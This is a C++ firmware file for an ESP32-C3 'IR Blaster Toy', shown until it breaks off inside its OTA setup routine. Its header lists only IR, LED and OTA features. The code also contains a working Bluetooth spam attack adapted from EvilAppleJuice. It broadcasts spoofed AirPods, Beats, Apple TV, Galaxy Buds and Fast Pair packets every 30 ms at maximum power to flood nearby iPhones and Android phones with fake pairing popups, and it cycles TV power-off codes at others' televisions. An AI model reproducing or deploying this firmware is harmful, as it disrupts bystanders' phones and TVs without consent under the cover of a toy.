/*
 * Firmware for the ESP32-C3 IR Blaster Toy
 * 
 * Best Embedded Engineer for the job, at your service.
 *
 * This firmware implements the complete operational logic, including:
 * - Continuous operation using millis()-based timing.
 * - Two modes based on a switch (GPIO 7): Play Mode and Demo/OTA Mode.
 * - Short press (<3s) runs for 10 seconds.
 * - Long press (>=3s) runs as long as the button is held.
 * - "Magical Glow" LED animation using simple blinking.
 * - Cyclical IR blasting of a comprehensive list of TV power-off codes.
 * - OTA firmware updates in Demo Mode over a custom Wi-Fi AP.
 */

// ######################################################################
// ##                       LIBRARY INCLUSIONS                         ##
// ######################################################################
#include <Arduino.h>
#include <IRremoteESP8266.h>
#include <IRsend.h>
#include <WiFi.h>
#include <ESPmDNS.h>
#include <WiFiUdp.h>
#include <ArduinoOTA.h>
#include <esp_task_wdt.h>
#include <BLEDevice.h>
#include <BLEAdvertising.h>
#include <BLEUtils.h>
#include <BLEServer.h>
#include <esp_ota_ops.h>
#include <esp_partition.h>

// ######################################################################
// ##                       HARDWARE DEFINITIONS                       ##
// ######################################################################

// --- Pin Definitions for ESP32-C3 Super Mini ---
// Available GPIO pins: 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 20, 21
// Avoid: GPIO 11-17 (SPI Flash), GPIO 18-19 (USB), GPIO 12-13 (SPI)
const int IR_LED_PIN = 2;     // GPIO 2 - Safe for output, commonly used for LEDs
const int LED1_PIN   = 6;     // GPIO 6 - Safe for output
const int LED2_PIN   = 4;     // GPIO 4 - Safe for output  
const int LED3_PIN   = 5;     // GPIO 5 - Safe for output
const int BUTTON_PIN = 3;     // GPIO 3 - Safe for input, active-high button with external pulldown
const int SWITCH_PIN = 7;     // GPIO 7 - Safe for input with external pulldown
const int DEBUG_LED_PIN = 8;  // GPIO 8 - Safe for output, debug LED

// --- IR Transmitter Object ---
// IR LED is active-low, so we want the pin HIGH when idle (off).
IRsend irsend(IR_LED_PIN, true); // true = active low output

// --- LED PWM Configuration for "Magical Glow" ---
// We use the ESP32's LEDC (LED Control) peripheral for efficient hardware PWM.
const int LED1_CHAN = 0; // PWM Channel 0
const int LED2_CHAN = 1; // PWM Channel 1
const int LED3_CHAN = 2; // PWM Channel 2
const int PWM_FREQ = 5000; // PWM frequency in Hz
const int PWM_RESOLUTION = 8; // 8-bit resolution (0-255)

// ######################################################################
// ##                       OTA MODE CONFIGURATION                     ##
// ######################################################################
const char* OTA_SSID = "REMO MAGICO!";
const char* OTA_PASSWORD = "moana123";

// ######################################################################
// ##                 IR CODE LIBRARY & STRUCTURES                     ##
// ######################################################################

// Struct to hold all information for a single IR command
struct IRCommand {
  decode_type_t protocol;
  uint64_t code;
  uint16_t bits; // Used for protocols like Sony that have variable bit lengths
};

// The master list of all IR commands to be sent
const IRCommand irCommands[] = {
  // Samsung
  {SAMSUNG, 0xE0E040BF, 32},
  {SAMSUNG, 0xE0E019E6, 32},
  {SAMSUNG, 0xE0E0E01F, 32}, // Samsung Power Toggle - common alternative
  // LG (NEC)
  {NEC, 0x20DF10EF, 32},
  {NEC, 0x20DF23DC, 32},
  // Sony
  {SONY, 0xA90, 12}, // 0xA90 is the standard Sony power code
  {SONY, 0x10A90, 20}, // 20-bit version
  // Panasonic (using NEC for compatibility)
  {NEC, 0x40040100BCBD, 32},
  // Philips (RC6)
  {RC6, 0xC, 20}, // 0xC is the standard RC6 power code
  {RC6, 0x10C, 20},
  // Sharp
  {SHARP, 0xB54A, 15}, // Standard Sharp power code
  {SHARP, 0xAA5A, 15}, // Sharp Power Toggle - common alternative
  // Toshiba (NEC)
  {NEC, 0x2FD48B7, 32},
  {NEC, 0x2FD807F, 32},
  // Vizio (NEC)
  {NEC, 0x20DF10EF, 32},
  {NEC, 0x20DF3EC1, 32},
  // Hisense (NEC)
  {NEC, 0x20DF40BF, 32},
  {NEC, 0x25D8C43B, 32},
  // TCL TV IR codes from DDRBoxman's gist
  {NEC, 0x57E318E7, 32}, // TCL Power (main power toggle)
  {NEC, 0x57E316E9, 32}, // TCL Power On
  {NEC, 0x57E3E817, 32}  // TCL Power (alternate)
};

const int numCommands = sizeof(irCommands) / sizeof(irCommands[0]);
int currentCommandIndex = 0;

// ######################################################################
// ##                  BLUETOOTH SPOOFING CONFIGURATION                ##
// ######################################################################

// EVILAPPLEJ UICE-ESP32 BLE SPAM IMPLEMENTATION
// Adapted from: https://github.com/ckcr4lyf/EvilAppleJuice-ESP32
// This implementation provides maximum effectiveness against iOS/Android devices

// Bluetooth maximum transmit power for ESP32-C3
#if defined(CONFIG_IDF_TARGET_ESP32C3) || defined(CONFIG_IDF_TARGET_ESP32C2) || defined(CONFIG_IDF_TARGET_ESP32S3)
#define MAX_TX_POWER ESP_PWR_LVL_P21  // ESP32C3 ESP32C2 ESP32S3
#elif defined(CONFIG_IDF_TARGET_ESP32H2) || defined(CONFIG_IDF_TARGET_ESP32C6)
#define MAX_TX_POWER ESP_PWR_LVL_P20  // ESP32H2 ESP32C6
#else
#define MAX_TX_POWER ESP_PWR_LVL_P9   // Default
#endif

// Apple device spam packets (headphones/earbuds - requires close range)
const uint8_t APPLE_DEVICES[][31] = {
  // AirPods
  {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x02, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
  // AirPods Pro
  {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x0e, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
  // AirPods Max
  {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x0a, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
  // AirPods Gen 2
  {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x0f, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
  // AirPods Gen 3
  {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x13, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
  // AirPods Pro Gen 2
  {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x14, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
  // PowerBeats
  {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x03, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
  // PowerBeats Pro
  {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x0b, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
  // Beats Solo Pro
  {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x0c, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
  // Beats Studio Buds
  {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x11, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
  // Beats Flex
  {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x10, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
  // Beats X
  {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x05, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
  // Beats Solo 3
  {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x06, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
  // Beats Studio 3
  {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x09, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
  // Beats Studio Pro
  {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x17, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
  // Beats Fit Pro
  {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x12, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
  // Beats Studio Buds Plus
  {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x16, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00}
};

// Apple setup/pairing packets (long range devices like Apple TV)
const uint8_t APPLE_SETUP_DEVICES[][23] = {
  // AppleTV Setup
  {0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 0x01, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00},
  // AppleTV Pair
  {0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 0x06, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00},
  // AppleTV New User
  {0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 0x20, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00},
  // AppleTV AppleID Setup
  {0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 0x2b, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00},
  // AppleTV Wireless Audio Sync
  {0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 0xc0, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00},
  // AppleTV Homekit Setup
  {0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 0x0d, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00},
  // AppleTV Keyboard Setup
  {0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 0x13, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00},
  // AppleTV Connecting to Network
  {0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 0x27, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00},
  // Homepod Setup
  {0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 0x0b, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00},
  // Setup New Phone
  {0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 0x09, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00},
  // Transfer Number
  {0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 0x02, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00},
  // TV Color Balance
  {0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 0x1e, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00},
  // Vision Pro
  {0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 0x24, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00}
};

// Samsung Galaxy Buds and Android Fast Pair packets (triggers Samsung/Android notifications)
const uint8_t SAMSUNG_DEVICES[][31] = {
  // Samsung Galaxy Buds
  {0x1e, 0xff, 0x75, 0x00, 0x01, 0x00, 0x02, 0x00, 0x01, 0x01, 0xff, 0x00, 0x00, 0x43, 0x21, 0x43, 0x21, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
  // Samsung Galaxy Buds Pro
  {0x1e, 0xff, 0x75, 0x00, 0x01, 0x00, 0x02, 0x00, 0x01, 0x02, 0xff, 0x00, 0x00, 0x43, 0x21, 0x43, 0x21, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
  // Samsung Galaxy Buds2
  {0x1e, 0xff, 0x75, 0x00, 0x01, 0x00, 0x02, 0x00, 0x01, 0x03, 0xff, 0x00, 0x00, 0x43, 0x21, 0x43, 0x21, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00}
};

// Android Fast Pair packets (triggers Android pairing notifications)
const uint8_t ANDROID_DEVICES[][31] = {
  // Google Pixel Buds Pro
  {0x1e, 0x03, 0x03, 0x2C, 0xFE, 0x16, 0x16, 0x2C, 0xFE, 0x92, 0xBB, 0xBD, 0x02, 0x0A, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
  // Sony WH-1000XM4 
  {0x1e, 0x03, 0x03, 0x2C, 0xFE, 0x16, 0x16, 0x2C, 0xFE, 0xCD, 0x82, 0x56, 0x02, 0x0A, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
  // JBL Flip 6
  {0x1e, 0x03, 0x03, 0x2C, 0xFE, 0x16, 0x16, 0x2C, 0xFE, 0x82, 0x1F, 0x66, 0x02, 0x0A, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
  // Bose NC 700
  {0x1e, 0x03, 0x03, 0x2C, 0xFE, 0x16, 0x16, 0x2C, 0xFE, 0xF5, 0x24, 0x94, 0x02, 0x0A, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
  // Samsung Galaxy Buds Live (Android Fast Pair)
  {0x1e, 0x03, 0x03, 0x2C, 0xFE, 0x16, 0x16, 0x2C, 0xFE, 0x92, 0xAD, 0xC9, 0x02, 0x0A, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00}
};

const int NUM_APPLE_DEVICES = sizeof(APPLE_DEVICES) / sizeof(APPLE_DEVICES[0]);
const int NUM_APPLE_SETUP_DEVICES = sizeof(APPLE_SETUP_DEVICES) / sizeof(APPLE_SETUP_DEVICES[0]);
const int NUM_SAMSUNG_DEVICES = sizeof(SAMSUNG_DEVICES) / sizeof(SAMSUNG_DEVICES[0]);
const int NUM_ANDROID_DEVICES = sizeof(ANDROID_DEVICES) / sizeof(ANDROID_DEVICES[0]);

// BLE objects and state
BLEAdvertising* pAdvertising = nullptr;
bool bleInitialized = false;
unsigned long lastBLESpoofTime = 0;
const unsigned long BLE_SPOOF_INTERVAL_MS = 30; // Very aggressive timing for maximum Samsung/Apple spam
int currentDeviceType = 0; // 0 = Apple headphones, 1 = Apple setup, 2 = Samsung, 3 = Android
int currentDeviceIndex = 0;
uint32_t delayMilliseconds = 30; // Very fast like EvilAppleJuice-ESP32

// ######################################################################
// ##                       STATE MACHINE VARIABLES                    ##
// ######################################################################
enum DeviceState {
  STATE_IDLE,
  STATE_CHECKING_PRESS,
  STATE_RUNNING_SHORT,
  STATE_RUNNING_LONG
};

DeviceState currentState = STATE_IDLE;
unsigned long lastButtonPressTime = 0;
unsigned long operationStartTime = 0;
unsigned long lastButtonCheck = 0;
bool lastButtonState = false;
bool isOtaMode = false;
bool breathingInitialized = false; // Track if breathing effect is initialized

// Timing constants
const unsigned long BUTTON_DEBOUNCE_MS = 50;
const unsigned long LONG_PRESS_MS = 3000;
const unsigned long SHORT_PRESS_DURATION_MS = 10000;

// PWM variables for breathing effect
volatile int currentBrightness = 0;
volatile bool breathingActive = false;
volatile unsigned long breathingStartTime = 0;
volatile int pwmCounter = 0;

// Timer variables
hw_timer_t * timer = NULL;
portMUX_TYPE timerMux = portMUX_INITIALIZER_UNLOCKED;

// ######################################################################
// ##                       FORWARD DECLARATIONS                       ##
// ######################################################################
void setupOTA();
void handleMagicalGlow();
void sendNextIrCode();
void handleButtonPress();
void updateStateMachine();
void IRAM_ATTR onTimer();
void setupTimer();
void setupBLE();
void handleBLESpoofing();
void cycleBLEDevice();
void printFlashInfo();
void optimizedOTASetup();

// ######################################################################
// ##                          SETUP FUNCTION                          ##
// ######################################################################
void setup() {
  Serial.begin(115200);
  Serial.println("\nBooting up...");

  // Configure watchdog timer (10 seconds timeout)
  esp_task_wdt_init(10, true); // 10 second timeout, panic on timeout
  esp_task_wdt_add(NULL); // Add current task to watchdog
  Serial.println("Watchdog timer configured (10s timeout)");

  // Print flash information for debugging
  printFlashInfo();

  // --- Configure GPIOs ---
  // Button with external pulldown for active-high operation
  pinMode(BUTTON_PIN, INPUT);         // External pulldown, active-high button
  pinMode(SWITCH_PIN, INPUT);         // External pulldown as mentioned by user
  
  // Outputs
  pinMode(IR_LED_PIN, OUTPUT);
  pinMode(LED1_PIN, OUTPUT);
  pinMode(LED2_PIN, OUTPUT);
  pinMode(LED3_PIN, OUTPUT);
  pinMode(DEBUG_LED_PIN, OUTPUT);

  // --- Initialize IR Sender ---
  irsend.begin();

  // --- Initialize LEDs (turn off initially) ---
  // For active-low LEDs: HIGH = off, LOW = on
  digitalWrite(LED1_PIN, HIGH);
  digitalWrite(LED2_PIN, HIGH);
  digitalWrite(LED3_PIN, HIGH);

  // Turn on debug LED to show device is running
  digitalWrite(DEBUG_LED_PIN, HIGH);
  Serial.println("Debug LED ON - Device running continuously");

  // Feed watchdog before potentially slow operations
  esp_task_wdt_reset();

  // Check mode switch
  isOtaMode = (digitalRead(SWITCH_PIN) == HIGH);
  if (isOtaMode) {
    Serial.println("Mode: Demo / OTA");
    optimizedOTASetup();  // Use optimized OTA setup
  } else {
    Serial.println("Mode: Play");
  }

  // Feed watchdog after OTA setup
  esp_task_wdt_reset();

  // Initialize Bluetooth for device spoofing
  setupBLE();

  // Initialize button state
  lastButtonState = digitalRead(BUTTON_PIN);
  lastButtonCheck = millis();
  
  // Setup hardware timer for smooth LED PWM
  setupTimer();
  
  Serial.println("Initialization complete. Entering main loop...");
}


// ######################################################################
// ##                          LOOP FUNCTION                           ##
// ######################################################################
void loop() {
  static unsigned long lastDebugPrint = 0;
  static unsigned long lastOtaHandle = 0;
  static unsigned long lastWatchdogFeed = 0;
  unsigned long now = millis();
  
  // Feed watchdog every 5 seconds to prevent reboot
  if (now - lastWatchdogFeed >= 5000) {
    esp_task_wdt_reset();
    lastWatchdogFeed = now;
  }
  
  // Debug output every 5 seconds to show the device is running
  if (now - lastDebugPrint >= 5000) {
    Serial.print("Loop running, State: ");
    Serial.print(currentState);
    Serial.print(", Button: ");
    Serial.print(digitalRead(BUTTON_PIN) ? "HIGH" : "LOW");
    Serial.print(", Switch: ");
    Serial.print(digitalRead(SWITCH_PIN) ? "HIGH" : "LOW");
    Serial.print(", Mode: ");
    Serial.print(isOtaMode ? "OTA" : "Play");
    Serial.print(", BLE: ");
    if (currentState != STATE_IDLE && bleInitialized) {
      Serial.print("ACTIVE (Apple/Samsung/Android Spam)");
    } else {
      Serial.print("IDLE");
    }
    Serial.print(", Free heap: ");
    Serial.print(ESP.getFreeHeap());
    Serial.println(" bytes");
    lastDebugPrint = now;
    
    // Visual feedback: Blink debug LED differently based on mode
    if (isOtaMode) {
      // In OTA mode: Quick double blink
      digitalWrite(DEBUG_LED_PIN, LOW);
      delay(50);
      digitalWrite(DEBUG_LED_PIN, HIGH);
      delay(50);
      digitalWrite(DEBUG_LED_PIN, LOW);
      delay(50);
      digitalWrite(DEBUG_LED_PIN, HIGH);
    } else {
      // In Play mode: Single blink
      digitalWrite(DEBUG_LED_PIN, LOW);
      delay(100);
      digitalWrite(DEBUG_LED_PIN, HIGH);
    }
  }
  
  // Always handle button press first, regardless of mode
  handleButtonPress();
  
  // Handle state machine - this should work in both play and OTA mode
  updateStateMachine();
  
  // Handle LED, IR operations and Bluetooth spoofing when in running states - works in both modes
  if (currentState == STATE_CHECKING_PRESS || currentState == STATE_RUNNING_SHORT || currentState == STATE_RUNNING_LONG) {
    handleMagicalGlow();
    sendNextIrCode();
    handleBLESpoofing(); // Only spoof Bluetooth when device is active
  }
  
  // Handle OTA if in OTA mode - but not too frequently to prevent blocking
  if (isOtaMode && (now - lastOtaHandle >= 50)) {
    try {
      ArduinoOTA.handle();
    } catch (...) {
      Serial.println("OTA handle exception caught, continuing...");
    }
    lastOtaHandle = now;
  }
  
  // Small delay to prevent overwhelming the system
  delay(10);
}


// ######################################################################
// ##                       HELPER FUNCTIONS                           ##
// ######################################################################

/**
 * @brief Handles button press detection with debouncing
 */
void handleButtonPress() {
  static unsigned long otaModeExitStartTime = 0;
  static bool otaExitInProgress = false;
  unsigned long now = millis();
  
  // Debounce button reading
  if (now - lastButtonCheck >= BUTTON_DEBOUNCE_MS) {
    bool currentButtonState = digitalRead(BUTTON_PIN);
    
    // Detect button press (transition from LOW to HIGH for active-high button)
    if (currentButtonState && !lastButtonState) {
      lastButtonPressTime = now;
      
      if (isOtaMode) {
        // In OTA mode: Start OTA exit timer OR start normal operation
        otaModeExitStartTime = now;
        otaExitInProgress = true;
        Serial.println("Button pressed in OTA mode - starting timer for mode exit or normal operation");
      }
      
      // Always allow normal button operation if in idle state
      if (currentState == STATE_IDLE) {
        Serial.println("Button press detected! Starting operation immediately...");
        currentState = STATE_CHECKING_PRESS;
        operationStartTime = now; // Start timing immediately
        breathingActive = true; // Start breathing effect
        breathingStartTime = now;
        
        // Start BLE spam when device becomes active
        if (bleInitialized) {
          lastBLESpoofTime = now; // Reset timer to start spoofing immediately
          currentDeviceType = 0; // Reset to Apple headphones
          currentDeviceIndex = 0; // Reset to first device
          cycleBLEDevice(); // Start with first device
          Serial.println("Apple/Samsung/Android BLE spam activated");
        }
      } else {
        Serial.println("Button press detected but not in idle state");
      }
    }
    
    // Handle OTA mode exit logic - only if button is still pressed
    if (isOtaMode && currentButtonState && otaExitInProgress) {
      unsigned long pressDuration = now - otaModeExitStartTime;
      
      if (pressDuration >= 5000) {
        // Button held for 5+ seconds - exit OTA mode
        Serial.println("Button held for 5+ seconds in OTA mode - EXITING OTA MODE!");
        
        // Stop WiFi and OTA
        ArduinoOTA.end();
        WiFi.softAPdisconnect(true);
        WiFi.mode(WIFI_OFF);
        delay(500);
        
        // Switch to play mode
        isOtaMode = false;
        
        // Reset state machine
        currentState = STATE_IDLE;
        breathingActive = false;
        
        // Stop BLE advertising when exiting OTA mode
        if (bleInitialized && pAdvertising) {
          pAdvertising->stop();
          Serial.println("BLE advertising stopped during OTA exit");
        }
        
        // Turn off all LEDs
        digitalWrite(LED1_PIN, HIGH);
        digitalWrite(LED2_PIN, HIGH);
        digitalWrite(LED3_PIN, HIGH);
        digitalWrite(DEBUG_LED_PIN, HIGH); // Keep debug LED on to show device is running
        
        Serial.println("Successfully switched to Play Mode!");
        
        // Reset timers
        otaExitInProgress = false;
        lastButtonPressTime = now;
      }
    }
    
    // Reset OTA exit timer if button is released before 5 seconds
    if (!currentButtonState && otaExitInProgress) {
      otaExitInProgress = false;
      Serial.println("Button released - OTA exit cancelled, normal operation continues");
    }
    
    // Debug output for button state changes
    if (currentButtonState != lastButtonState) {
      Serial.print("Button state changed to: ");
      Serial.println(currentButtonState ? "HIGH (pressed)" : "LOW (released)");
      
      // In OTA mode, show instructions
      if (isOtaMode && currentButtonState) {
        Serial.println("In OTA mode - Short press: normal operation, Long press (5s): exit to Play mode");
      }
    }
    
    lastButtonState = currentButtonState;
    lastButtonCheck = now;
  }
}

/**
 * @brief Updates the state machine based on current state and timing
 */
void updateStateMachine() {
  unsigned long now = millis();
  
  switch (currentState) {
    case STATE_IDLE:
      // Do nothing, wait for button press
      // No delay needed here as we have delay in main loop
      break;
      
    case STATE_CHECKING_PRESS:
      if (digitalRead(BUTTON_PIN)) {
        // Button still pressed (HIGH), check if it's been long enough for long press
        if (now - lastButtonPressTime >= LONG_PRESS_MS) {
          Serial.println("Long press threshold reached! Continuing until button release...");
          currentState = STATE_RUNNING_LONG;
          // Keep the same operationStartTime so timing continues from button press
        }
      } else {
        // Button released (LOW) before long press threshold
        Serial.println("Short press completed! Will run for 10 seconds total...");
        currentState = STATE_RUNNING_SHORT;
        // Keep the same operationStartTime so timing continues from button press
      }
      break;
      
    case STATE_RUNNING_SHORT:
      // Check if 10 seconds have elapsed from the initial button press
      if (now - operationStartTime >= SHORT_PRESS_DURATION_MS) {
        Serial.println("Short press timer expired. Returning to idle.");
        currentState = STATE_IDLE;
        breathingActive = false; // Stop breathing effect
        // Stop BLE advertising when going idle
        if (bleInitialized && pAdvertising) {
          pAdvertising->stop();
          Serial.println("BLE advertising stopped");
        }
        // Turn off LEDs
        digitalWrite(LED1_PIN, HIGH);
        digitalWrite(LED2_PIN, HIGH);
        digitalWrite(LED3_PIN, HIGH);
      }
      break;
      
    case STATE_RUNNING_LONG:
      // Check if button has been released (active-high button goes LOW when released)
      if (!digitalRead(BUTTON_PIN)) {
        Serial.println("Button released. Returning to idle.");
        currentState = STATE_IDLE;
        breathingActive = false; // Stop breathing effect
        // Stop BLE advertising when going idle
        if (bleInitialized && pAdvertising) {
          pAdvertising->stop();
          Serial.println("BLE advertising stopped");
        }
        // Turn off LEDs
        digitalWrite(LED1_PIN, HIGH);
        digitalWrite(LED2_PIN, HIGH);
        digitalWrite(LED3_PIN, HIGH);
      }
      break;
  }
}

/**
 * @brief Sets up the Wi-Fi Access Point and OTA handlers.
 */
void setupOTA() {
  Serial.println("Setting up OTA Access Point...");
  
  // Add a safety check to prevent infinite setup loops
  static bool otaSetupAttempted = false;
  if (otaSetupAttempted) {
    Serial.println("OTA setup already attempted, skipping to prevent bootloop");
    return;
  }
  otaSetupAttempted = true;
  
  // ESP32-C3 specific: Ensure WiFi is properly reset
  Serial.println("Resetting WiFi subsystem...");
  WiFi.mode(WIFI_OFF);
  delay(500); // Longer delay for ESP32-C3
  
  // Disconnect any existing connections
  WiFi.disconnect(true);
  delay(200);
  
  // Set WiFi mode to AP only
  Serial.println("Setting WiFi mode to AP...");
  if (!WiFi.mode(WIFI_AP)) {
    Serial.println("Failed to set WiFi mode to AP! Continuing without OTA...");
    return;
  }
  delay(300);
  
  // Configure AP with specific settings for ESP32-C3 stability
